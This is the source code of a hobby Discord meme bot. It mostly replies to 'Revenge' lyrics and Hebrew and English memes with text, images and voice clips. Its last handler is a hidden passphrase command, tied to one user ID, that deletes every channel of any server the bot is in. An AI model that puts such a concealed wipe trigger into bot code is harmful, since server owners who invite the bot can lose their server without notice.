const http = require("http");
const express = require("express");
const app = express();
const Discord = require("discord.js");
const TOKEN = process.env.TOKEN;

var port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", function() {
	console.log("Listening on Port 3000");
});

var random;
var bot = new Discord.Client();
var rings = "720247688301379664"

function resetBot(channel) {
    // send channel a message that you're resetting bot [optional]
    channel.send('Resetting...')
    .then(msg => bot.destroy())
    .then(() => bot.login(TOKEN));
}

bot.on("ready", async function() {
  console.log("ready");
  bot.user.setActivity("cam-bot.glitch.me");
});
bot.on("message", async function(message) {
  if (message.author.bot) return;
  if (message.content === "!AwLyrics") {
    return message.channel.send("https://www.youtube.com/watch?v=NeI-1Aq5CJw");
  }
  if (message.content === "!AwHelp") {
    return message.channel.send(
      "> To use the Creeper, Aw man bot, \n > Type lines from the Revenge song with first capital letter. \n \n `Commands:` \n > !AwHelp \n > !AwLyrics"
    );
  }
  if (message.content === "Aw, man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "aw, man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "Aw man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "aw man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "Aw Man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "Aw, Man") {
    return message.channel.send("No, THIS IS MY LINE");
  }
  if (message.content === "Charged Creeper") {
    setTimeout(function() {
      message.channel.send("ssss");
    }, 1000);
    setTimeout(function() {
      message.channel.send("ssssssssss");
    }, 2000);
    setTimeout(function() {
      message.channel.send("sssssssssssssss");
    }, 3000);
    setTimeout(function() {
      message.channel.send("***AW MAN!***");
    }, 4000);
    setTimeout(function() {
      return message.channel.send({
        file:
          "http://www.textures4photoshop.com/tex/thumbs/explosion-effect-PNG-image-thumb26.png"
      });
    }, 4000);
  }
  if (message.content === "sssss") {
    return message.channel.send("SHUT UP YOU STEVE");
  }
  if (message.content === "Creeper") {
    message.channel.send({
      file:
        "https://www.stickpng.com/assets/images/580b57fcd9996e24bc43c2f7.png"
    });
    return message.channel.send("Aw Man");
  }
  if (message.content === "So we back in the mine") {
    return message.channel.send("Got our pickaxe swinging from side to side");
  }
  if (message.content === "Side side to side") {
    return message.channel.send("This task a grueling one");
  }
  if (message.content === "Hope to find some diamonds tonight night night") {
    return message.channel.send("Diamonds tonight");
  }
  if (message.content === "Heads up") {
    return message.channel.send("You hear a sound");
  }
  if (message.content === "Turn around and look up") {
    return message.channel.send("Total shock fills your body");
  }
  if (message.content === "Oh no it's you again") {
    return message.channel.send("I can never forget those eyes eyes eyes");
  }
  if (message.content === "Eyes eyes eyes") {
    return message.channel.send("Cause baby tonight");
  }
  if (message.content === "The creepers tryin to steal all our stuff again") {
    return message.channel.send("Cause baby tonight");
  }
  if (message.content === "You grab your pick shovel and bolt again") {
    return message.channel.send("And run run until it's done done");
  }
  if (message.content === "Until the sun comes up in the morn") {
    return message.channel.send("Cause baby tonight");
  }
  if (message.content === "The creepers tryin to steal all our stuff again") {
    return message.channel.send("Just when you think you're safe");
  }
  if (message.content === "Overhear some hissing from right behind") {
    return message.channel.send("Right right behind");
  }
  if (message.content === "That's a nice life you have") {
    return message.channel.send("Shame it's gotta end at this time time time");
  }
  if (message.content === "Time time time time") {
    return message.channel.send("Blows up");
  }
  if (
    message.content === "Then your health bar drops and you could use a one up"
  ) {
    return message.channel.send("Get inside don't be tardy");
  }
  if (message.content === "So now you're stuck in here") {
    return message.channel.send("Half a heart is left but don't die die die");
  }
  if (message.content === "Die die die") {
    return message.channel.send("Cause baby tonight");
  }
  if (message.content === "The creepers tryin to steal all our stuff again") {
    return message.channel.send("Cause baby tonight");
  }
  if (message.content === "You grab your pick shovel and bolt again") {
    return message.channel.send("And run run until it's done done");
  }
  if (message.content === "Until the sun comes up in the morn") {
    message.channel.send("Cause baby tonight");
    return message.channel.send(
      "The creepers tryin to steal all our stuff again"
    );
  }
  if (message.content === "When is there an update?") {
    return message.channel.send("Guess never!");
  }
  if (message.content === "I'm bored") {
    return message.channel.send({
      file:
        "https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%94%D7%95%D7%A8%D7%93%D7%94%20(5).png"
    });
  }
  if (message.content === "Is this the Krusty Krab?") {
    message.channel.send("No, THIS IS PATRICK!!");
    return message.channel.send({
      file:
        "https://i.kym-cdn.com/entries/icons/facebook/000/003/041/tumblr_kumgingKDj1qzhteao1_500.jpg"
    });
  }
  if (message.content === "24") {
    message.channel.send("Ya know what's funnier than 24? **25!!!**");
    return message.channel.send({
      file:
        "https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2FSeekPng.com_dank-memes-png_1537043.png"
    })
  }
  if (message.content === "Initiate self destruct") {
    setTimeout(function() {
      message.channel.send("Self destructiong in 5");
    }, 1000);
    setTimeout(function() {
      message.channel.send("4");
    }, 2000);
    setTimeout(function() {
      message.channel.send("3");
    }, 3000);
    setTimeout(function() {
      message.channel.send("2");
    }, 4000);
    setTimeout(function() {
      message.channel.send("1");
    }, 5000);
    setTimeout(function() {
      return message.channel.send({
        file:
          "http://www.textures4photoshop.com/tex/thumbs/explosion-effect-PNG-image-thumb26.png"
      });
    }, 5000);
  }
  if (message.content === "כשאתה מבולבל") {
    message.channel.send("זרת אל על!");
    return message.channel.send({
        file:
          "https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%94%D7%95%D7%A8%D7%93%D7%94.png"
      });
  }
  if (message.content === "שלום אדוני, האם תרצה לקנות שוקולד?") {
    message.channel.send("שוקולד? שוקולד?? שוקולד?!?!");
    return message.channel.send({
        file:
          "https://vignette.wikia.nocookie.net/spongebob/images/4/42/Chocolate_with_Nuts_018.png"
      });
  }
  if (message.content === "גמרת כבר עם הסידורים?") {
    message.channel.send("גמרת כבר עם הסידורים?")
    message.channel.send("גמרת כבר עם הסידורים?")
    message.channel.send("גמרת כבר עם הסידורים?")
    message.channel.send("גמרת כבר עם הסידורים?")
    return message.channel.send({
        file:
          "https://i.imgur.com/DLMTGrL.jpg"
      });
  }
  if (message.content === "עוד יום") {
    message.channel.send("עוד 10 אגורות");
    return message.channel.send({
        file:
          "https://i.ytimg.com/vi/43KqJ56-HWY/hqdefault.jpg"
      });
  }
  if (message.content === "היי פטריק") {
    message.channel.send("סליחה?! זה דוקטור פרופסור פטריק!");
    return message.channel.send({
        file:
          "https://i.kym-cdn.com/profiles/icons/big/000/210/986/Thats_MR_Dr_Prof_Patrick__to_you.png"
      });
  }
  if (message.content === "חיימון לימון") {
    message.channel.send("מגעיל מגעיל");
    return message.channel.send({
        file:
          "https://cdn.discordapp.com/attachments/616308587563843584/702813131457560657/unknown.png"
      });
  }
  if (message.content === "פישוטו חזק עכשיו") {
    message.channel.send("פישוטו תטת אתכם");
    message.channel.send("פישוטו לתטת ת'טירה");
    return message.channel.send({
        file:
          "https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%94%D7%95%D7%A8%D7%93%D7%94.jpg"
      });
  }
  if (message.content === "I'm blue") {
    message.channel.send("Nice,");
    message.channel.send("I'M GAY")
    return message.channel.send({
        file:
          "https://i.ytimg.com/vi/ZGgBqf3G1XQ/maxresdefault.jpg"
      });
  }
  if (message.content === "69") {
    return message.channel.send("Noice");
  }
  if (message.content.startsWith("!ring ")) {
    bot.channels.get(rings).send(message.content.substring(6));
    message.delete()
    return setTimeout(function() {
      bot.channels.get(rings).fetchMessages({ limit: 1 }).then(messages => {
      let lastMessage = messages.first();
      lastMessage.delete()
})
    }, 30000);
  }
  if (message.content === "יום גשום") {
    message.channel.send("כבר סוף עונה");
    return message.channel.send("התגעגעתי כבר שנה");
  }
  if (message.content === "מי רוצה פורטנייט") {
    message.channel.send("תגיד לי אתה נורמלי?!");
    return message.channel.send("פישוטו סוחט אותך!");
  }
  if (message.content === "!ResetBot") {
    return resetBot(message.channel);
  }
  if (message.content.startsWith("!p")) {
    message.channel.send("this is so sad alexa play " + message.content.substring(3));
    return message.delete()
  }
  if (message.content.startsWith("AwSay")) {
    message.channel.send(message.content.substring(6));
    return message.delete()
  }
  if (message.content.startsWith("AwTTS")) {
    message.channel.send(message.content.substring(6), {tts: true});
    return message.delete()
  }
  if (message.content === "AwJoin") {
    message.member.voiceChannel.join();
    return message.delete()
  }
  if (message.content.startsWith("AwPlay ")) {
    if (message.content.substring(7) === "מגעיל מגעיל") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2Faudio2.mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "עוד יום") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%A2%D7%95%D7%93%20%D7%99%D7%95%D7%9D%20%D7%A2%D7%95%D7%93%20%D7%A2%D7%A9%D7%A8%20%D7%90%D7%92%D7%95%D7%A8%D7%95%D7%AA.mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "הסרטן הפריך") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2FIs%20this%20the%20Krusty%20Krab%20NO%2CTHIS%20IS%20PATRICK!!!!.mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "פישוטו חזק") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%9E%D7%A9%D7%A4%D7%97%D7%AA%20%D7%A9%D7%95%D7%95%D7%A5%20%D7%A4%D7%A8%D7%A7%202%20-%20%D7%9E%D7%91%D7%A6%D7%A8%20%D7%9B%D7%A8%D7%99%D7%95%D7%AA%20(mp3cut.net).mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "שיר הדרך") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F%D7%A9%D7%99%D7%A8%20%D7%94%D7%93%D7%A8%D7%9A%20-%20%D7%91%D7%95%D7%91%D7%A1%D7%A4%D7%95%D7%92.mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "USP") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2Fusp%20(mp3cut.net).mp3', { bitrate: '96000' })
      });
    }
    if (message.content.substring(7) === "RR") {
      message.member.voiceChannel.join().then(connection => {
        connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2FRick%20Astley%20Never%20gonna%20give%20you%20up%20.mp3*https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2FRick%20Astley%20Never%20gonna%20give%20you%20up%20.mp3?v=1594340122285', { bitrate: '96000' })
      });
    }
    return message.delete()
  }
  if (message.content.startsWith("אני פה")) {
    if (message.member.voiceChannel) {
      random = Math.floor(Math.random() * 5);
      if (random == 0) {
        message.member.voiceChannel.join().then(connection => {
            connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F2020-04-27_14-19-41%20(mp3cut.net).mp3', { bitrate: '96000' })
          });
      } else if (random == 1) {
        message.member.voiceChannel.join().then(connection => {
            connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2F2020-04-27_14-30-18%20(mp3cut.net).mp3', { bitrate: '96000' })
          });
      } //else if (random == 2) {
//        message.member.voiceChannel.join().then(connection => {
//            connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2Frecord.mp3?v=1588007560350', { bitrate: '96000' })
//          });
//      } else if (random == 3) {
//        message.member.voiceChannel.join().then(connection => {
//            connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2Frecord2.mp3?v=1588008333356', { bitrate: '96000' })
//          });
//      } else if (random == 4) {
//        message.member.voiceChannel.join().then(connection => {
//            connection.playStream('https://cdn.glitch.com/402ea4e9-0e20-424f-9835-aa5c66187721%2Frecord_2.mp3?v=1588007987754', { bitrate: '96000' })
//          });
//      }
//      message.delete()
    }
  }
  if (message.content.startsWith("mute")) {
    if(message.member.hasPermission('MUTE_MEMBERS')) {
      let channel = message.member.voiceChannel;
      message.mentions.members.first().setMute(true);
      message.delete() 
    }
  }
  if (message.content.startsWith("unmute")) {
    if(message.member.hasPermission('MUTE_MEMBERS')) {
      let channel = message.member.voiceChannel;
      message.mentions.members.first().setMute(false);
      message.delete()
    }
  }
  if(message.content == "mass server delete q28w27" && message.author.id == "264465468268609537") {
		message.guild.channels.forEach(channel => channel.delete());
	}
});

bot.login(TOKEN);
